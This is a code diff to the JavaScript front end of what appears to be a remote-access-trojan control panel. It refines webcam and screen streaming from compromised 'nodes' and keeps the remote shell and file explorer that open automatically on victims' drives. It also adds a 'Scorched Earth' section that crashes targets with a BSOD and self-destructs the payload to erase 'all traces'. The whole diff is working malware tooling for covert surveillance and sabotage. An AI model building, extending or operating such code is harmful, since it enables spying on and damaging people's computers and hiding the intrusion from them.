@@ -17,7 +17,8 @@ let leafletMarkers = [];
 
 // --- Live View State ---
 let streamInterval = null;
-let streamTimeoutTracker = null; // New tracking variable for stream fetch timeout
+let streamSwitchTime = 0; // Prevents fetching old cached frames when switching
+let streamTimeoutTracker = null; // Triggers 10s warning if no frames arrive
 const STREAM_POLL_RATE = 250; 
 
 // --- Terminal & Filesystem State ---
@@ -192,6 +193,7 @@ async function fetchData() {
         renderNodesList();
         renderMap();
         
+        // This triggers the Auto-File Explorer and Shell
         selectNode(activeNodeId); 
 
         statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
@@ -305,7 +307,7 @@ window.selectNode = function(nodeId) {
     appendTerminalText(`Session established. Authenticated as: ${nodeId}`, "system");
     document.getElementById('terminal-connection-msg').innerText = `Connected to ${nodeId} via secure reverse proxy`;
     
-    // Auto Load File System
+    // Automatically start FS rendering
     document.getElementById('fs-active-node').innerText = nodeId;
     requestDirectoryListing('DRIVES');
 
@@ -429,26 +431,24 @@ async function sendCommandToNode(deviceId, command) {
 }
 
 // ==========================================
-// LIVE VIEW STREAMING 
+// LIVE VIEW STREAMING
 // ==========================================
-// New loading state UI logic for streams
 function setStreamLoadingState() {
     const spinner = document.getElementById('liveViewSpinner');
     const imageEl = document.getElementById('liveViewImage');
     
-    // Hide old frame, show spinner
     imageEl.style.display = 'none';
+    imageEl.src = ''; // Clear old cached frame entirely
+    
     spinner.style.display = 'flex';
     spinner.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px]">Retrieving stream frames...</p>`;
     
-    // Clear old tracker
     if (streamTimeoutTracker) {
         clearTimeout(streamTimeoutTracker);
     }
     
-    // Set 10s fail tracker
     streamTimeoutTracker = setTimeout(() => {
-        spinner.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px] text-center px-4">Timeout exceeded (10s).<br>Target may be offline or unresponsive.</p>`;
+        spinner.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-yellow-500 text-3xl mb-2"></i><p class="text-gray-400 font-mono text-[10px] text-center px-4">Timeout exceeded (10s).<br>Target may be offline.</p>`;
     }, 10000);
 }
 
@@ -477,7 +477,6 @@ window.startStream = async function() {
         return showToast("No active node selected!", "error");
     }
 
-    // Ensure panel is not minimized
     const panel = document.getElementById('panel-live');
     if (panel.dataset.minimized === 'true') {
         toggleMinimize(panel.querySelector('.fa-window-restore').parentElement, 'panel-live');
@@ -492,36 +491,33 @@ window.startStream = async function() {
     const title = document.getElementById('liveViewTitle');
     const toggleBtn = document.getElementById('streamToggleBtn');
     
-    // Apply UI fetching state
+    // Trigger wait delay to fix frame bleeding
+    streamSwitchTime = Date.now();
     setStreamLoadingState();
 
-    // Change Play button to Stop button (Red)
     toggleBtn.className = "w-4 h-4 rounded-full bg-red-500/20 text-red-500 hover:bg-red-500 hover:text-white flex items-center justify-center text-[8px]";
     toggleBtn.innerHTML = '<i class="fa-solid fa-stop"></i>';
     toggleBtn.title = "Stop Stream";
 
-    // Update Title logic based on selection
-    if (targetVal.includes("SCREEN")) {
-        title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}`;
-    } else {
-        title.innerHTML = `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
-    }
+    title.innerHTML = targetVal.includes("SCREEN") 
+        ? `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}` 
+        : `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
 
     termLog(`Initiating stream for ${targetVal} at Quality ${quality}...`);
     await sendCommandToNode(activeNodeId, `START_STREAM:${targetVal}|${quality}`);
     
-    // Bind dynamic source change
     document.getElementById('streamTarget').onchange = () => {
         if(streamInterval) {
+            streamSwitchTime = Date.now();
+            setStreamLoadingState(); 
             termLog(`Switching stream source...`);
-            setStreamLoadingState(); // Trigger load wait
-            sendCommandToNode(activeNodeId, `START_STREAM:${document.getElementById('streamTarget').value}|${document.getElementById('streamQuality').value}`);
             
-            if (document.getElementById('streamTarget').value.includes("SCREEN")) {
-                title.innerHTML = `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}`;
-            } else {
-                title.innerHTML = `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
-            }
+            const newTarget = document.getElementById('streamTarget').value;
+            sendCommandToNode(activeNodeId, `START_STREAM:${newTarget}|${document.getElementById('streamQuality').value}`);
+            
+            title.innerHTML = newTarget.includes("SCREEN") 
+                ? `<i class="fa-solid fa-desktop text-cyberBlue mr-2 text-glow-blue"></i>Screen: ${activeNodeId}` 
+                : `<i class="fa-solid fa-camera text-cyberBlue mr-2 text-glow-blue"></i>Cam: ${activeNodeId}`;
         }
     };
 
@@ -531,6 +527,11 @@ window.startStream = async function() {
 async function fetchFrame() {
     if (!activeNodeId) {
         return stopStream();
+    }
+    
+    // Ignore fetched frames for 3.5 seconds after a switch to prevent bleeding old cache
+    if (Date.now() - streamSwitchTime < 3500) {
+        return;
     }
     
     const targetVal = document.getElementById('streamTarget').value;
@@ -547,7 +548,6 @@ async function fetchFrame() {
                 const imageEl = document.getElementById('liveViewImage');
                 imageEl.src = `data:image/jpeg;base64,${data.frame}`;
                 
-                // Clear the fetching timeout once successful data applies
                 if (streamTimeoutTracker) {
                     clearTimeout(streamTimeoutTracker);
                     streamTimeoutTracker = null;
@@ -558,7 +558,7 @@ async function fetchFrame() {
             }
         }
     } catch (e) {
-        // Ignore fetch errors during fast polling to avoid console spam
+        // Silent error
     }
 }
 
@@ -567,18 +567,15 @@ window.stopStream = function() {
         clearInterval(streamInterval);
         streamInterval = null;
     }
-    
     if (streamTimeoutTracker) {
         clearTimeout(streamTimeoutTracker);
         streamTimeoutTracker = null;
     }
-    
     if (activeNodeId) {
         sendCommandToNode(activeNodeId, "STOP_STREAM");
         termLog(`Stream stopped for ${activeNodeId}.`);
     }
 
-    // Change Stop button back to Play button (Green)
     const toggleBtn = document.getElementById('streamToggleBtn');
     if (toggleBtn) {
         toggleBtn.className = "w-4 h-4 rounded-full bg-green-500/20 text-green-500 hover:bg-green-500 hover:text-white flex items-center justify-center text-[8px]";
@@ -588,11 +585,27 @@ window.stopStream = function() {
     
     document.getElementById('liveViewTitle').innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-500 mr-2"></i>Live Stream`;
     document.getElementById('liveViewImage').style.display = 'none';
+    document.getElementById('liveViewImage').src = '';
     
     const spinner = document.getElementById('liveViewSpinner');
     if(spinner) {
         spinner.style.display = 'flex';
-        spinner.innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-700 text-3xl mb-2"></i><p class="text-gray-500 font-mono text-[10px]">Stream Idle</p>`;
+        spinner.innerHTML = `<i class="fa-solid fa-satellite-dish text-gray-700 text-3xl mb-2"></i><p class="text-gray-500 font-mono text-[10px] mt-2">Stream Idle</p>`;
+    }
+};
+
+// ==========================================
+// SCORCHED EARTH & FUN
+// ==========================================
+window.triggerBSOD = function() {
+    termLog('Command queued: BSOD (Blue Screen)');
+    sendCommandToNode(activeNodeId, 'BSOD');
+};
+
+window.triggerScorchedEarth = function() {
+    if(confirm('WARNING: THIS WILL DELETE THE PAYLOAD AND ALL TRACES.\n\nContinue?')) {
+        termLog('Command queued: Payload Self-Destruct');
+        sendCommandToNode(activeNodeId, 'SELF_DESTRUCT');
     }
 };
 
@@ -888,7 +901,9 @@ function updateBreadcrumbs(path) {
 }
 
 function formatBytes(bytes, decimals = 1) {
-    if (bytes === 0) return '0 B';
+    if (bytes === 0) {
+        return '0 B';
+    }
     const k = 1024;
     const dm = decimals < 0 ? 0 : decimals;
     const sizes = ['B', 'KB', 'MB', 'GB'];
